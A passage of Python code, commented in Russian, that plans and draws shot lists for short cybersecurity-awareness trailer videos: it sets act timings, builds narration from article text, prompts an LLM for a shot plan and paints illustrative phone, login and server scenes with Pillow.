            sc("problem", 1.5 * k, _pv_(2), _cam(2), [], "match",
               "notify", (1.0, 1.1)),
            sc("problem", 1.5 * k, _pv_(3), _cam(3), [], _tr_(2),
               "whoosh", (1.1, 1.3)),
            sc("escalation", 1.2 * k, "keyboard", _cam(5), [],
               "hard_cut", "click", (1.2, 1.6)),
            sc("escalation", 0.8 * k, "qr_scan", _cam(6), [],
               "hard_cut", "whoosh", (1.5, 2.0)),
            sc("escalation", 1.6 * k, "server_corridor", _cam(1), [],
               "match", "riser", (0.9, 1.5)),
            sc("peak", 0.8 * k, peak_pool[0], "shake", [], "hard_cut",
               "impact", (1.4, 1.4), "accent2", typ="graphic"),
            sc("peak", 0.5 * k, peak_pool[1], "shake", [], "hard_cut",
               "click", (1.6, 1.6)),
            sc("peak", 0.7 * k, peak_pool[2], "push_in", [], "whip",
               "bass", (1.5, 1.5)),
            sc("accel", 1.6 * k, "keyboard", _cam(0),
               tx("1 ОШИБКА", mode="pop"), "hard_cut", "bass", (1.0, 1.4)),
            sc("accel", 1.3 * k, "consequence", _cam(1),
               tx("1 АККАУНТ", mode="pop"), "match", "impact", (1.0, 1.4)),
            sc("climax", 0.7 * k, "attack_grid", "shake", [], "hard_cut",
               "impact", (1.5, 1.5), "accent2", typ="graphic"),
            sc("climax", 3.4 * k, "final_brand", "push_out", [], "hard_cut",
               "impact", (0.7, 1.0), typ="graphic"),
        ]

    # M23: озвучка из модульных dict с {TOPIC} placeholder
    # Берём тематический dict (если есть) или generic
    primary_theme = themes[0] if themes else None
    narr_raw = _THEME_NARR.get(primary_theme, _NARR_GENERIC)
    # подстановка {TOPIC} → short (мгновенно, без f-string конструктора)
    NARR = {
        act: [(v.replace("{TOPIC}", short), s.replace("{TOPIC}", short))
              for v, s in entries]
        for act, entries in narr_raw.items()
    }
    _narr_i = {a: 0 for a in NARR}
    _narr_used = {a: set() for a in NARR}

    # M23: контекст-зависимый шаблон — визуалы из тематического пула,
    # а НЕ захардкоженные. Каждый акт = своя визуальная логика.
    # Структура (тайминги/акты) детерминирована, визуал — из pv[].
    shots = [
        # 0-3с: HOOK — максимально сильный удар
        sc("hook", 2.8 * k, _pv_(0), _cam(0),
           tx("ВАС УЖЕ МОГУТ", "ВЗЛОМАТЬ", mode="tracking"), _tr_(0),
           "impact", (0.7, 1.3), "accent2", typ="typography"),
        # 3-10с: ПРОБЛЕМА — бытовые ситуации.
        sc("problem", 2.0 * k, _pv_(1), _cam(1), [], _tr_(1),
           "notify", (1.0, 1.2)),
        sc("problem", 0.9 * k, "flash", "static",
           tx("ОДНА ССЫЛКА", mode="pop"), "hard_cut", "click",
           typ="typography"),
        sc("problem", 1.6 * k, _pv_(2), _cam(2), [], "match",
           "notify", (1.0, 1.1)),
        sc("problem", 0.7 * k, "flash", "static",
           tx("ОДИН ЗВОНОК", mode="pop"), "hard_cut", "click",
           typ="typography"),
        sc("problem", 1.5 * k, _pv_(3), _cam(3), [], _tr_(2),
           "whoosh", (1.1, 1.3)),
        sc("problem", 0.7 * k, "flash", "static",
           tx("ОДИН КЛИК", mode="pop"), "hard_cut", "impact",
           typ="typography"),
        sc("problem", 1.3 * k, _pv_(4), _cam(4), [], _tr_(3),
           "notify", (0.9, 1.1)),
        # 10-20с: ЭСКАЛАЦИЯ — нарастание масштаба.
        sc("escalation", 1.4 * k, "keyboard", _cam(5), [], "hard_cut",
           "click", (1.2, 1.6)),
        sc("escalation", 0.8 * k, "qr_scan", _cam(6), [], "hard_cut",
           "whoosh", (1.5, 2.0)),
        sc("escalation", 1.1 * k, _pv_(5), _cam(0), [], _tr_(4),
           "notify"),
        sc("escalation", 0.7 * k, "flash", "static",
           tx("ДОСТУП", mode="pop"), "hard_cut", "bass", typ="typography"),
        sc("escalation", 1.6 * k, "server_corridor", _cam(1), [],
           "match", "riser", (0.9, 1.5)),
        sc("escalation", 0.9 * k, "cables", _cam(2), [], "hard_cut",
           "click", (1.3, 1.7)),
        # 20-30с: ПИК ДИНАМИКИ — быстрые кадры 0.5-0.9с, красный accent2.
        sc("peak", 0.8 * k, peak_pool[0], "shake", [], "hard_cut",
           "impact", (1.4, 1.4), "accent2", typ="graphic"),
        sc("peak", 0.5 * k, peak_pool[1], "shake", [], "hard_cut",
           "click", (1.6, 1.6)),
        sc("peak", 0.7 * k, peak_pool[2], "push_in", [], "whip",
           "bass", (1.5, 1.5)),
        sc("peak", 0.5 * k, peak_pool[3], "snap", [], "hard_cut",
           "whoosh", (1.8, 1.8)),
        sc("peak", 0.8 * k, peak_pool[4], "shake",
           tx("СЕССИЯ УКРАДЕНА", mode="tracking"), "glitch", "impact",
           (1.3, 1.3), "accent2", fx="glitch"),
        sc("peak", 0.6 * k, peak_pool[5], "drift", [], "hard_cut",
           "click", (1.6, 1.6)),
        sc("peak", 0.9 * k, peak_pool[6], "push_in",
           tx("ДОСТУП РАЗРЕШЁН", mode="pop"), "dip", "bass", (1.2, 0.6),
           "accent2"),
        # 30-35с: РЕЗКАЯ ПАУЗА — темп и звук падают.
        sc("twist", 1.6 * k, "pause_black", "static",
           tx("НО САМОЕ", "СТРАШНОЕ...", mode="reveal"), "dip", "silence",
           (0.4, 0.4), typ="typography"),
        sc("twist", 1.2 * k, "pause_black", "static", [], "dip",
           "silence", (0.3, 0.3)),
        sc("twist", 2.0 * k, "eye", _cam(3),
           tx("ОТКРОЕТЕ ДВЕРЬ", "ВЫ САМИ", mode="tracking"), "zoom",
           "impact", (0.5, 1.8)),
        # 35-50с: ФИНАЛЬНОЕ УСКОРЕНИЕ — масштаб растёт.
        sc("accel", 1.6 * k, "keyboard", _cam(0),
           tx("1 ОШИБКА", mode="pop"), "hard_cut", "bass", (1.0, 1.4)),
        sc("accel", 1.3 * k, "consequence", _cam(1),
           tx("1 АККАУНТ", mode="pop"), "match", "impact", (1.0, 1.4)),
        sc("accel", 1.2 * k, "consequence", _cam(2),
           tx("1 УСТРОЙСТВО", mode="pop"), "whip", "impact", (1.0, 1.6)),
        sc("accel", 1.8 * k, "consequence", _cam(3),
           tx("ВСЯ СИСТЕМА", mode="tracking"), "zoom", "riser", (0.8, 1.6),
           "accent2"),
        # 50-60с: КУЛЬМИНАЦИЯ — быстрые кадры, затем резкое замедление.
        sc("climax", 0.7 * k, "attack_grid", "shake", [], "hard_cut",
           "impact", (1.5, 1.5), "accent2", typ="graphic"),
        sc("climax", 0.5 * k, _pv_(6), "snap", [], "hard_cut",
           "bass", (1.4, 1.4)),
        sc("climax", 0.8 * k, "server_corridor", _cam(4), [], "whip",
           "whoosh", (1.0, 2.2)),
        sc("climax", 1.2 * k, "pause_black", "static", [], "dip",
           "silence", (0.4, 0.4)),
        # финал — кинематографично: маленький текст, пауза, бренд
        sc("climax", 2.0 * k, "final_q", "static",
           tx("КТО КОГО", mode="whisper"), "dip", "bass", (0.6, 0.8),
           typ="typography"),
        sc("climax", 2.4 * k, "final_q", "static",
           tx("ЗАЩИЩАЕТ?", mode="whisper"), "dip", "silence", (0.5, 0.6),
           typ="typography"),
        sc("climax", 3.4 * k, "final_brand", "push_out", [], "hard_cut",
           "impact", (0.7, 1.0), typ="graphic"),
    ]
    if variant == 1:
        shots = _v1_shots()
    elif variant == 2:
        shots = _v2_shots()
    elif variant == 3:
        shots = _v3_shots()
    elif variant == 4:
        shots = _v4_shots()
    elif variant == 5:
        shots = _v5_shots()
    elif variant == 6:
        shots = _v6_shots()
    elif variant == 7:
        shots = _v7_shots()
    total = sum(s["dur"] for s in shots)
    out = []
    for i, s in enumerate(shots):
        s = dict(s)
        s["id"] = f"S{i + 1:02d}"
        act = s.get("act", "problem")
        pool = NARR.get(act) or NARR["problem"]
        used = _narr_used.get(act, set())
        idx = _narr_i.get(act, 0)
        start = idx
        while idx % len(pool) in used and (idx - start) < len(pool):
            idx += 1
        if (idx - start) >= len(pool):
            _narr_used[act] = set()
            used = set()
            idx = start
        chosen = idx % len(pool)
        v, b = pool[chosen]
        _narr_i[act] = idx + 1
        _narr_used[act] = used | {chosen}
        if not s.get("voice"):
            s["voice"] = v[:140]
        if not s.get("sub"):
            s["sub"] = b[:70]
            if s.get("type") == "cinematic":
                s["subs"] = [{"lines": [s["sub"]], "mode": "sub"}]
        s["dur"] = max(s["dur"], _min_dur(s))
        s["seed"] = (abs(hash(topic)) + i * 131) % (2 ** 32)
        out.append(s)
    return out


def script_to_shots(script_text, topic=None, seconds=55,
                    style_name="cybersecurity_cinematic"):
    """СТАТЬЯ -> SHOT LIST (M17): озвучка и субтитры — из текста статьи.

    Каждая секция parse_script -> кинокадры (voice-чанки ≤140 символов,
    sub = тот же чанк ≤70, синхрон TikTok) + одна ударная типографика
    из заголовка. Акты: hook -> problem -> escalation/peak/twist/accel ->
    climax + финал (whisper + бренд). Generic-пулы NARR НЕ используются —
    ни одной чужой фразы в видео по статье.
    Возвращает (shots, target_seconds): длина подгоняется под озвучку
    статьи (как /videotest script-режим), но не более 120с.
    """
    import re as _re
    sections = vg.parse_script(script_text)
    topic = ((topic or "").strip()
             or sections[0]["heading"] or "Разбор").strip()
    short = topic[:48]
    k = max(0.4, seconds / 42.0)

    def sc(act, dur, visual, camera, texts, trans_out, sfx="none",
           speed=(1.0, 1.0), accent="accent", fx="", typ=None,
           voice="", sub=""):
        if typ is None:
            typ = ("typography"
                   if (texts and visual in PURE_TYPO_VISUALS) else "cinematic")
        subs = ([{"lines": [sub[:70]], "mode": "sub"}]
                if (sub and typ == "cinematic") else [])
        return {"act": act, "dur": dur, "visual": visual, "camera": camera,
                "texts": texts, "subs": subs, "sub": sub[:70], "voice": voice[:140],
                "trans_out": trans_out, "sfx": sfx,
                "speed": speed, "accent": accent, "fx": fx, "type": typ}

    def tx(*lines, mode="pop"):
        return [{"lines": [l.upper().strip()[:24] for l in lines], "mode": mode}]

    def _hard_split(text, limit):
        # жёсткая нарезка по словам (длинные слова — по символам)
        words, cur, out = str(text).split(), "", []
        for w in words:
            t = (cur + " " + w).strip()
            if len(t) <= limit:
                cur = t
            else:
                if cur:
                    out.append(cur)
                while len(w) > limit:
                    out.append(w[:limit])
                    w = w[limit:]
                cur = w
        if cur:
            out.append(cur)
        return out or [str(text)[:limit]]

    def _sentences(body):
        parts = _re.split(r"(?<=[.!?…;:])\s+", body.strip())
        return [p.strip() for p in parts if p.strip()]

    def _smart_sub(chunk, limit=70):
        # субтитр по границе слов, синхронен чанку озвучки
        if len(chunk) <= limit:
            return chunk
        cut = chunk[:limit].rsplit(" ", 1)
        return cut[0] if len(cut) == 2 and len(cut[0]) >= limit // 2 else chunk[:limit]

    def _typo_lines(heading):
        # ударная вставка из заголовка: до 3 слов, до 2 строк ≤24.
        # Авточасти parse_script («Часть N») вставок не получают.
        if (heading or "").upper().startswith("ЧАСТЬ"):
            return None
        words = [w.strip("«»\"'.,!?—–-").upper()
                 for w in (heading or "").split()]
        words = [w for w in words if w][:3]
        if not words:
            return None
        lines, cur = [], ""
        for w in words:
            t = (cur + " " + w).strip()
            if len(t) <= 24:
                cur = t
            elif not lines:
                lines.append(cur or w[:24])
                cur = "" if cur else ""
            else:
                break
        if cur:
            lines.append(cur)
        return lines[:2] or None

    # Все предложения секции (бюджет ~100с ниже сам подрежет длинные
    # статьи); короткие статьи озвучиваются целиком
    sec_chunks = []
    for sec in sections:
        sents = _sentences(sec["body"])
        chunks = []
        for sent in sents:
            chunks.extend(_hard_split(sent, 140))
        sec_chunks.append({"heading": sec["heading"],
                           "chunks": chunks[:8] or [sec["body"][:140]]})

    def _voice_est():
        return sum(len(c) / 12.0 + 0.5
                   for s in sec_chunks for c in s["chunks"] if c)

    # бюджет озвучки ~100с: сначала режем лишние чанки, потом — средние секции
    for _ in range(64):
        if _voice_est() <= 100:
            break
        cand = [s for s in sec_chunks if len(s["chunks"]) > 1]
        if not cand:
            break
        longest = max(cand, key=lambda s: sum(map(len, s["chunks"])))
        longest["chunks"].pop()
    for _ in range(64):
        if _voice_est() <= 100 or len(sec_chunks) <= 2:
            break
        sec_chunks.pop(len(sec_chunks) // 2)

    pairs = [(si, c) for si, s in enumerate(sec_chunks)
             for c in s["chunks"] if c]
    if len(pairs) == 1 and len(pairs[0][1]) > 70:
        # вырожденный вход (одно предложение): делим на hook + climax,
        # иначе QC voice_covers_all не закроется
        txt = pairs[0][1]
        cut = txt[:len(txt) // 2].rsplit(" ", 1)
        mid = len(cut[0]) if len(cut) == 2 and len(cut[0]) >= 20 else len(txt) // 2
        pairs = [(pairs[0][0], txt[:mid].strip()),
                 (pairs[0][0], txt[mid:].strip())]
    n = len(pairs)

    # Акты по длине чанков (best-effort под QC climax_faster: финал короче
    # пика). Порядок контента не трогаем — только метки актов.
    acts = [None] * n
    acts[0] = "hook"
    if n >= 2:
        # climax — самый короткий из хвоста, сосед — accel
        tail = [n - 1] if n < 4 else [n - 2, n - 1]
        cl = min(tail, key=lambda i: len(pairs[i][1]))
        acts[cl] = "climax"
        for i in tail:
            if acts[i] is None:
                acts[i] = "accel"
    if n >= 3 and acts[1] is None:
        acts[1] = "problem"
    free_mid = [i for i in range(2, n - 1) if acts[i] is None]
    if free_mid and "peak" not in acts:
        # peak — самому длинному среднему чанку
        acts[max(free_mid, key=lambda i: len(pairs[i][1]))] = "peak"
    cyc = ["escalation", "peak", "twist", "accel"]
    ci = 0
    for i in range(n):
        if acts[i] is None:
            acts[i] = cyc[ci % len(cyc)]
            ci += 1

    # M23: тематические визуалы вместо хардкода
    themes = extract_visual_theme(topic)
    pv = theme_painters(themes)
    cm = theme_cameras(themes)
    tr = theme_trans(themes)
    visuals = pv[:15] if len(pv) >= 15 else pv + ["phone_message", "login_screen",
               "keyboard", "qr_scan", "server_corridor", "cables", "person",
               "face_glow", "eye", "server_rack", "consequence", "bokeh"][:15 - len(pv)]
    peak_pool = [v for v in visuals[:8] if v not in PURE_TYPO_VISUALS] or ["attack_grid", "face_glow",
                 "server_corridor", "eye", "consequence"]
    cameras = cm[:6] if len(cm) >= 6 else cm + ["push_in", "drift", "push_out",
               "tilt", "whip_pan", "static"][:6 - len(cm)]
    trans_pool = tr[:6] if len(tr) >= 6 else tr + ["hard_cut", "whip", "zoom",
                  "match", "dip", "glitch"][:6 - len(tr)]

    # M18: стартовая позиция видеоряда от хэша статьи — разные статьи
    # дают разный порядок художников/камер, а не один и тот же цикл
    off = abs(hash(script_text))
    shots, vi = [], off % len(visuals)
    for i, (si, chunk) in enumerate(pairs):
        act = acts[i]
        if act == "peak":
            vis, accent = peak_pool[(i + off) % len(peak_pool)], "accent2"
        else:
            vis, accent = visuals[vi % len(visuals)], "accent"
            vi += 1
        sfx = "impact" if act == "peak" else ("bass" if act == "hook" else "none")
        dur = max(1.0, len(chunk) / 12.0 + 0.6)
        shots.append(
            {"sec": si,
             "shot": sc(act, dur, vis, cameras[(i + off) % len(cameras)], [],
                        trans_pool[(i * 3 + off) % len(trans_pool)], sfx, (1.2, 1.2),
                        accent, "", None, chunk, _smart_sub(chunk))})

    # сборка по секциям: кадры + ударная типографика из заголовка;
    # посередине — резкая пауза (QC pause_before_climax)
    out = []
    half = max(1, len(sec_chunks) // 2)
    out_pause = False
    for si, sec in enumerate(sec_chunks):
        for item in shots:
            if item["sec"] == si:
                out.append(item["shot"])
        tl = _typo_lines(sec["heading"])
        if tl:
            out.append(sc("accel" if si else "problem", 1.2 * k,
                          "flash" if si % 2 else "question", "snap",
                          tx(*tl), "hard_cut", "click", (1.4, 1.4),
                          typ="typography"))
        if si + 1 == half and len(sec_chunks) > 1:
            out.append(sc("twist", 1.6 * k, "pause_black", "static",
                          [], "dip", "silence", (0.4, 0.4)))
            out_pause = True  # noqa: F841 (флаг читается после цикла)
    if not out_pause and len(out) >= 6:
        # одна секция без разбивки: пауза посередине всё равно нужна
        # (финал добавляется позже, тут кадров ещё меньше итога)
        out.insert(len(out) // 2,
                   sc("twist", 1.6 * k, "pause_black", "static",
                      [], "dip", "silence", (0.4, 0.4)))
    # финал: заголовок последней секции шёпотом + бренд
    last_head = sec_chunks[-1]["heading"] if sec_chunks else short
    fl = _typo_lines(last_head) or [short.upper().strip()[:24]]
    out.append(sc("climax", 2.0 * k, "final_q", "static",
                  tx(*fl, mode="whisper"), "dip", "bass", (0.6, 0.8),
                  typ="typography"))
    out.append(sc("climax", 3.4 * k, "final_brand", "push_out", [],
                  "hard_cut", "impact", (0.7, 1.0), typ="graphic"))
    # лимит coerce (40): сначала жертвуем средними типографиками
    for _ in range(64):
        if len(out) <= 40:
            break
        for j in range(len(out) - 3, 2, -1):
            s = out[j]
            if (s.get("type") == "typography"
                    and not {t.get("mode") for t in s.get("texts", [])}
                    <= {"whisper"}):
                del out[j]
                break
        else:
            break
    out = out[:40]

    total = sum(s["dur"] for s in out)
    res = []
    for i, s in enumerate(out):
        s = dict(s)
        s["id"] = f"S{i + 1:02d}"
        s["dur"] = max(s["dur"], _min_dur(s))
        s["seed"] = (abs(hash(script_text)) + i * 131) % (2 ** 32)
        res.append(s)
    est_voice = sum(len(s["voice"]) / 12.0 + 0.5
                    for s in res if s.get("voice"))
    n_static = sum(1 for s in res if not s.get("voice"))
    target = min(120.0, max(float(seconds), est_voice + n_static * 1.0 + 4))
    print(f"[cine] план по статье: {len(res)} шотов, "
          f"озвучка ~{est_voice:.0f}с, цель {target:.0f}с")
    return res, target


def plan_shots(topic, seconds=55, style_name="cybersecurity_cinematic",
               use_llm=True, provider=None, variant=None):
    """TOPIC -> SHOT LIST: сначала LLM, при любой ошибке — шаблон по теме."""
    if use_llm:
        try:
            from llm import _complete  # noqa: PLC0415 (опционально, только в проде)
            prompt = (
                f"Ты — режиссёр монтажа cybersecurity-трейлера 9:16 на {seconds} сек. "
                f"Тема ролика: «{topic}». Разбей на акты hook/problem/escalation/"
                f"peak/twist/accel/climax: сильный hook 0-3с, пик динамики 20-30с "
                f"(кадры 0.3-1.2с), резкая пауза 30-35с, кульминация в конце. "
                f"Каждому шоту задай type: cinematic (кинокадр БЕЗ текста) / "
                f"typography (короткая ударная вставка 1-3 СЛОВА) / graphic. "
                f"Чередуй cinematic->typography->cinematic, НИКАКИХ двух "
                f"typography подряд (доля typography ~25%). Тексты — по-русски, "
                f"ЗАГЛАВНЫМИ, максимум 3 слова на строку, до 3 строк (это НЕ "
                f"субтитры; длинные фразы разбивай на последовательные шоты). "
                f"match — только между похожими кадрами; accent2 — только "
                f"threat/compromised/warning. Никаких Matrix/хакеров в капюшонах/"
                f"зелёных терминалов. {SHOT_SCHEMA_HINT}"
            )
            raw = _complete([{"role": "user", "content": prompt}], provider)
            m = re.search(r"\{.*\}", raw, re.S)
            data = __import__("json").loads(m.group(0) if m else raw)
            shots = _coerce_shots(data.get("shots"), seconds)
            print(f"[cine] LLM-план: {len(shots)} шотов по теме «{topic}»")
            for i, s in enumerate(shots):
                s["id"] = f"S{i + 1:02d}"
                s.setdefault("seed", 2000 + i * 91)
            return shots
        except Exception as e:
            print(f"[cine] LLM-план недоступен ({type(e).__name__}: {e}) — шаблон по теме")
    return template_shots(topic, seconds, style_name, variant)


# ---------- художники сцен (всё рисуется кодом, без внешних ассетов) ----------

def _vignette(img, strength=0.55):
    import math as _m
    w, h = img.size
    ov = Image.new("L", (w, h), 0)
    d = ImageDraw.Draw(ov)
    cx, cy = w / 2, h / 2
    maxd = _m.hypot(cx, cy)
    for r in range(0, int(maxd), 24):
        a = int(255 * strength * (r / maxd) ** 2)
        d.ellipse([cx - r, cy - r, cx + r, cy + r], outline=a)
    black = Image.new("RGB", (w, h), (0, 0, 0))
    return Image.composite(black, img, ov)


def _grain(img, seed, n=420, alpha=26):
    rnd = random.Random(seed)
    w, h = img.size
    ov = Image.new("RGBA", img.size, (0, 0, 0, 0))
    d = ImageDraw.Draw(ov)
    for _ in range(n):
        x, y = rnd.randrange(w), rnd.randrange(h)
        v = rnd.randrange(150, 255)
        d.point((x, y), fill=(v, v, v, alpha))
    return Image.alpha_composite(img.convert("RGBA"), ov).convert("RGB")


def _glow_spot(base, x, y, r, color, alpha=90):
    ov = Image.new("RGBA", base.size, (0, 0, 0, 0))
    d = ImageDraw.Draw(ov)
    for i in range(6, 0, -1):
        rr = r * i // 6
        d.ellipse([x - rr, y - rr, x + rr, y + rr],
                  fill=color + (alpha * (7 - i) // 36 + 8,))
    return Image.alpha_composite(base, ov)


def _bg(P, seed, deep=False):
    """Тёмный кинематографичный фон: вертикальный градиент + свечение."""
    c0 = P["bg_deep"] if deep else P["bg"]
    c1 = P["bg"]
    img = Image.new("RGB", (W, H))
    d = ImageDraw.Draw(img)
    for y in range(0, H, 4):
        t = y / H
        d.line([(0, y), (W, y + 4)],
               fill=tuple(int(c0[i] + (c1[i] - c0[i]) * t) for i in range(3)))
    rnd = random.Random(seed)
    gx, gy = rnd.randrange(W), rnd.randrange(H // 3, 2 * H // 3)
    img = _glow_spot(img.convert("RGBA"), gx, gy, 480, P["accent"], 46).convert("RGB")
    return img


def _bokeh_layer(d, seed, P, n=26, y_band=None):
    rnd = random.Random(seed)
    for _ in range(n):
        x = rnd.randrange(0, W)
        y = rnd.randrange(*y_band) if y_band else rnd.randrange(0, H)
        r = rnd.randrange(8, 60)
        col = P["accent"] if rnd.random() < 0.3 else (90, 110, 150)
        d.ellipse([x - r, y - r, x + r, y + r], outline=col + (70,), width=2)


def _phone_frame(d, P, cx, cy, pw=420, ph=840, glow=None):
    """Корпус смартфона + тёмный экран. Возвращает (x0, y0, pw, ph) экрана."""
    x0, y0 = cx - pw // 2, cy - ph // 2
    d.rounded_rectangle([x0 - 26, y0 - 26, x0 + pw + 26, y0 + ph + 26],
                        radius=64, fill=(16, 22, 38), outline=P["line"], width=3)
    d.rounded_rectangle([x0, y0, x0 + pw, y0 + ph], radius=44, fill=(4, 7, 14))
    if glow:
        d.rounded_rectangle([x0, y0, x0 + pw, y0 + ph], radius=44, outline=glow, width=4)
    d.rounded_rectangle([cx - 90, y0 + 14, cx + 90, y0 + 44], radius=15, fill=(4, 7, 14),
                        outline=P["line"], width=2)
    return x0, y0, pw, ph


def _paint_phone_screen(d, kind, box, P, f_s, f_xs, p, rnd, accent):
    x0, y0, pw, ph = box
    pad = 44
    if kind == "message":
        # всплывающее сообщение
        slide = int((1 - min(1.0, p * 2.2)) * 120)
        by = y0 + 220 + slide
        d.rounded_rectangle([x0 + pad, by, x0 + pw - pad, by + 250], radius=28, fill=(22, 32, 56))
        d.ellipse([x0 + pad + 24, by + 30, x0 + pad + 104, by + 110], fill=accent)
        d.text((x0 + pad + 130, by + 34), "БАНК", font=f_s, fill=(240, 244, 252))
        d.rectangle([x0 + pad + 24, by + 140, x0 + pw - pad - 60, by + 158], fill=(120, 135, 165))
        d.rectangle([x0 + pad + 24, by + 176, x0 + pw - pad - 140, by + 194], fill=(90, 105, 135))
        if p > 0.45:  # красная точка уведомления
            rr = 16 + int(6 * math.sin(p * 20))
            d.ellipse([x0 + pw - pad - 40, by + 20, x0 + pw - pad - 40 + 2 * rr, by + 20 + 2 * rr],
                      fill=P.get("accent2") or (255, 80, 80))
    elif kind == "call":
        d.ellipse([x0 + pw // 2 - 90, y0 + 220, x0 + pw // 2 + 90, y0 + 400], outline=accent, width=5)
        _center_text(d, y0 + 450, "ВХОДЯЩИЙ ВЫЗОВ", f_xs, P["sub"], x0 + pw // 2)
        _center_text(d, y0 + 510, "+7 ••• •• 90", f_s, (240, 244, 252), x0 + pw // 2)
        d.rounded_rectangle([x0 + 60, y0 + 620, x0 + pw - 60, y0 + 700], radius=40, fill=accent)
        _center_text(d, y0 + 642, "ОТВЕТИТЬ", f_s, (6, 8, 14), x0 + pw // 2)
    elif kind == "login":
        _center_text(d, y0 + 180, "МОЙ БАНК", f_s, (240, 244, 252), x0 + pw // 2)
        for j, Stars in enumerate(("•••• 4821", "••••••••")):
            fy = y0 + 300 + j * 130
            d.rounded_rectangle([x0 + pad, fy, x0 + pw - pad, fy + 96], radius=20,
                                outline=P["line"] if j else accent, width=3)
            d.text((x0 + pad + 28, fy + 24), Stars, font=f_s, fill=(200, 210, 230))
        d.rounded_rectangle([x0 + pad, y0 + 580, x0 + pw - pad, y0 + 676], radius=24, fill=accent)
        _center_text(d, y0 + 606, "ВОЙТИ", f_s, (6, 8, 14), x0 + pw // 2)
    elif kind == "qr":
        qs, qn = 300, 21
        qx, qy = x0 + (pw - qs) // 2, y0 + 250
        d.rectangle([qx - 24, qy - 24, qx + qs + 24, qy + qs + 24], fill=(235, 240, 250))
        cell = qs / qn
        for r_ in range(qn):
            for c_ in range(qn):
                in_finder = (r_ < 7 and c_ < 7) or (r_ < 7 and c_ >= qn - 7) or (r_ >= qn - 7 and c_ < 7)
                on = in_finder or rnd.random() < 0.42
                if on:
                    d.rectangle([qx + c_ * cell, qy + r_ * cell,
                                 qx + (c_ + 1) * cell, qy + (r_ + 1) * cell], fill=(8, 10, 16))
        _center_text(d, qy + qs + 50, "СКАНИРУЙТЕ ДЛЯ ВХОДА", f_xs, P["sub"], x0 + pw // 2)
    elif kind == "token":
        _center_text(d, y0 + 220, "КОД ИЗ SMS", f_xs, P["sub"], x0 + pw // 2)
        code = "482 910"
        _center_text(d, y0 + 300, code, _font(EXO2, 84, 900), accent, x0 + pw // 2)
        bw = int((pw - 2 * pad) * (1 - p))
        d.rectangle([x0 + pad, y0 + 470, x0 + pad + bw, y0 + 484], fill=accent)
        _center_text(d, y0 + 540, "никому не сообщайте", f_xs, P["sub"], x0 + pw // 2)


def _center_text(d, y, text, f, fill, cx):
    w_, _ = _ts(d, text, f)
    d.text((cx - w_ // 2, y), text, font=f, fill=fill)


def paint_scene(visual, p, seed, P, fonts, accent_key="accent"):
    """Рисует один кадр сцены. p — локальный прогресс 0..1 (уже с warp)."""
    accent = P["accent2"] if accent_key == "accent2" and P.get("accent2") else P["accent"]
    f_h = fonts["hero"]
    f_s = fonts["sub"]
    f_xs = fonts["xs"]
    rnd = random.Random(seed)
    img = _bg(P, seed, deep=visual in ("pause_black", "final_brand", "question"))
    d = ImageDraw.Draw(img, "RGBA")

    if visual == "phone_dark":
        _bokeh_layer(d, seed + 1, P, 18)
        box = _phone_frame(d, P, W // 2, H // 2 + 120, glow=accent)
        _paint_phone_screen(d, "message", box, P, f_s, f_xs, 0.0, rnd, accent)
        # тревожное свечение нарастает — в цвете акцента шота
        # (красный accent2 — только если шот помечен как threat/warning)
        img = _glow_spot(img.convert("RGBA"), W // 2, H // 2 + 120, int(300 + 200 * p),
                         accent, int(30 + 50 * p)).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
    elif visual in ("phone_message", "phone_call", "login_screen", "qr_panel", "token_panel"):
        kind = {"phone_message": "message", "phone_call": "call",
                "login_screen": "login", "qr_panel": "qr",
                "token_panel": "token"}[visual]
        _bokeh_layer(d, seed + 2, P, 14)
        box = _phone_frame(d, P, W // 2, H // 2 + 60, glow=accent)
        _paint_phone_screen(d, kind, box, P, f_s, f_xs, p, random.Random(seed + 9), accent)
    elif visual == "chain":
        labels = ["MESSAGE", "CLICK", "LOGIN", "TOKEN", "ACCESS"]
        _bokeh_layer(d, seed + 3, P, 12)
        y = H // 2
        d.line([(80, y), (W - 80, y)], fill=P["line"], width=6)
        n = len(labels)
        active = min(n - 1, int(p * n))
        for i, lab in enumerate(labels):
            x = 80 + i * (W - 160) // (n - 1)
            on = i <= active
            col = accent if on else P["line"]
            r_ = 34 if on else 24
            d.ellipse([x - r_, y - r_, x + r_, y + r_], fill=(10, 16, 30), outline=col, width=5)
            lw, _ = _ts(d, lab, f_xs)
            d.text((x - lw // 2, y + 70), lab, font=f_xs, fill=(240, 244, 252) if on else P["sub"])
        # бегущий импульс
        ix = 80 + p * (W - 160)
        img = _glow_spot(img.convert("RGBA"), int(ix), y, 90, accent, 80).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
    elif visual == "attack_grid":
        kinds = ["message", "login", "qr", "call"]
        cells = [(40, 220, 480, 700), (560, 220, 480, 700), (40, 980, 480, 700), (560, 980, 480, 700)]
        act_idx = min(3, int(p * 4.2))
        for j, ((cx, cy, cw, chh), kd) in enumerate(zip(cells, kinds)):
            on = j == act_idx
            d.rounded_rectangle([cx, cy, cx + cw, cy + chh], radius=24,
                                fill=(8, 13, 25), outline=accent if on else P["line"],
                                width=5 if on else 2)
            mini = (cx + 40, cy + 60, cw - 80, chh - 160)
            _paint_phone_screen(d, kd, mini, P, f_xs, f_xs, (p * 3 + j * 0.3) % 1.0,
                                random.Random(seed + j), accent if on else P["sub"])
        _center_text(d, 90, "АТАКА // 4 ВЕКТОРА", f_s, accent, W // 2)
    elif visual == "server_rack":
        _bokeh_layer(d, seed + 4, P, 10)
        for r_ in range(8):
            y = 300 + r_ * 170
            d.rounded_rectangle([140, y, W - 140, y + 130], radius=14, fill=(10, 16, 30),
                                outline=P["line"], width=2)
            for u in range(6):
                x = 200 + u * 120
                led = accent if ((r_ * 7 + u * 3 + int(p * 12)) % 5 == 0) else (40, 60, 95)
                d.ellipse([x, y + 50, x + 30, y + 80], fill=led)
                d.rectangle([x + 44, y + 58, x + 100, y + 72], fill=(30, 42, 68))
    elif visual == "cables":
        for j in range(7):
            y0 = 300 + j * 200
            pts = [(0, y0 + rnd.randrange(-60, 60))]
            for x in range(120, W + 120, 120):
                pts.append((x, y0 + rnd.randrange(-90, 90)))
            d.line(pts, fill=P["line"] if j % 2 else accent, width=5 if j % 2 == 0 else 3)
        # бегущий свет по кабелям
        px = int(p * W)
        d.line([(px, 200), (px, H - 200)], fill=accent, width=6)
    elif visual == "bokeh":
        _bokeh_layer(d, seed + 5, P, 40)
        img = _glow_spot(img.convert("RGBA"), W // 2, H // 2, 420, accent, 60).convert("RGB")
        d = ImageDraw.Draw(img, "RGBA")
    elif visual == "eye":
